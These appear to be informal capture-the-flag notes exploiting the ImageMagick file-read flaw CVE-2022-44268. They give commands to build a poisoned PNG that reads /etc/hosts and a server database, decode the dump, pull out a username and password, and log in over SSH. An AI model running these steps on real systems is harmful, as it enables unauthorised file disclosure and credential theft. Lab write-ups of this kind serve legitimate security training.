https://nvd.nist.gov/vuln/detail/CVE-2022-44268

Proof of Concept
https://github.com/kljunowsky/CVE-2022-44268

1. Clone git:
```
git clone https://github.com/kljunowsky/CVE-2022-44268.git 
```

2. Create  poisoned image:
```
python3 CVE-2022-44268.py --image imagetopoison.png --file-to-read /etc/hosts --output poisoned.png
```

3. Upload image

4. Check if exploit was successful:
```
python3 CVE-2022-44268.py --url http://vulnerable-imagemagick.com/uploads/vulnerable.png
```

![[Pasted image 20231107224159.png]]

Lets grab db
```
python3 CVE-2022-44268.py --image Untitled.png --file-to-read /var/db/pilgrimage --output poisoned.png
```

![[Pasted image 20231108081109.png]]

.... some shit with decoding. After some search i found solution - read raw 
![[Pasted image 20231108081606.png]]

and wohoo. we have a db dump
![[Pasted image 20231108081906.png]]

so lets put this into file and convert from hex
![[Pasted image 20231108082546.png]]

lets checking db and we will find some creds 
username: emily
passwd: abigchonkyboi123
![[Pasted image 20231108082853.png]]

ssh with creds and bingo!
![[Pasted image 20231108083517.png]]
